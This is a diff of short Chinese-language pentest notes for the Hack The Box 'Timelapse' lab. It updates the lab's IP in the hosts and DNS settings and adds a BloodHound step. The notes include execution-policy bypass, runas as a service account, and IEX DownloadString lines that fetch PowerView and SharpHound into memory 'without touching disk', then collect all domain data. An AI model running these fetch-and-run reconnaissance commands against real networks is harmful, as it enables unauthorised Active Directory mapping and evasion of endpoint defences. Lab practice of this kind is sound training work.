@@ -3,26 +3,24 @@ Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
 
 
 >>>先Enable IPv6, 以連OpenVPN: 
-  Enable-NetAdapterBinding -Name "Ethernet0" -ComponentID ms_tcpip6
-  Enable-NetAdapterBinding -Name "OpenVPN TAP-Windows6" -ComponentID ms_tcpip6
+  Enable-NetAdapterBinding -Name "Ethernet0" -ComponentID ms_tcpip6; Enable-NetAdapterBinding -Name "OpenVPN TAP-Windows6" -ComponentID ms_tcpip6
 >>> Host的Path:
   C:\Windows\System32\drivers\etc
 >>> 最後加幾行:
-  10.129.95.210    timelapse.htb
-  10.129.95.210    dc01.timelapse.htb
-  10.129.95.210    dc01
-  10.129.95.210    timelapse
+10.129.227.113    timelapse.htb
+10.129.227.113    dc01.timelapse.htb
+10.129.227.113    dc01
+10.129.227.113    timelapse
 >>> Powershell
   ipconfig /flushdns
 
 
 原生Win10 Powershell: 
   >>> Set DNS: 
-    Set-DnsClientServerAddress -InterfaceAlias "Ethernet0" -ServerAddresses "10.129.95.210", "8.8.8.8"
-    Set-DnsClientServerAddress -InterfaceAlias "OpenVPN TAP-Windows6" -ServerAddresses "10.129.95.210", "8.8.8.8"
+    Set-DnsClientServerAddress -InterfaceAlias "Ethernet0" -ServerAddresses "10.129.227.113", "8.8.8.8"
+    Set-DnsClientServerAddress -InterfaceAlias "OpenVPN TAP-Windows6" -ServerAddresses "10.129.227.113", "8.8.8.8"
   >>> 停用IPv6: 
-    Disable-NetAdapterBinding -Name "Ethernet0" -ComponentID ms_tcpip6
-    Disable-NetAdapterBinding -Name "OpenVPN TAP-Windows6" -ComponentID ms_tcpip6
+    Disable-NetAdapterBinding -Name "Ethernet0" -ComponentID ms_tcpip6; Disable-NetAdapterBinding -Name "OpenVPN TAP-Windows6" -ComponentID ms_tcpip6
   >>>獲取Timelapse Domain Shell:
     runas /netonly /user:timelapse.htb\svc_deploy powershell
   >>> 低權限Timelapse account:
@@ -40,3 +38,8 @@ Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
 >>> PowerView:
   >>>> 直接下載 PowerView並載入到 記憶體中, 不落Harddisk:
     IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1")
+
+
+>>> BloodHound / SharpHound (in-memory, 不落硬碟):
+  IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1")
+  Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp -ZipFileName timelapse_bh.zip
